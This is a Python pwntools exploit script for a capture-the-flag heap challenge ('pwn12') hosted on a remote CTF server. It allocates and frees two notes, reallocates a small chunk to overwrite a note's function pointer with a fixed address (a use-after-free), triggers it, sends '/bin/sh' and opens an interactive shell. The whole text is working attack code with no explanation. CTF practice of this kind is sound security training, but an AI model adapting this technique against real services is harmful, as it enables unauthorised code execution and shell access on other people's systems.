from pwn import *

# UNDO
context(log_level='debug', os='linux', arch='i386')
# p=process("./pwn12")
p = remote("node4.buuoj.cn", 28290)


def bug():
    gdb.attach(p)
    pause()


def add(size, c):
    p.recvuntil("Your choice :")
    p.sendline(str(1))
    p.sendlineafter(b"Note size :", str(size))
    p.sendafter(b"Content :", c)


def free(i):
    p.recvuntil("Your choice :")
    p.sendline(str(2))
    p.sendlineafter(b"Index :", str(i))


def dump(i):
    p.recvuntil("Your choice :")
    p.sendline(str(3))
    p.sendlineafter(b"Index :", str(i))


add(0x20, b'aaaa')
add(0x20, b'bbbb')
free(0)
free(1)
# bug()
add(0x8, p32(0x8048945))
dump(0)
p.sendline(b'/bin/sh')

p.interactive()
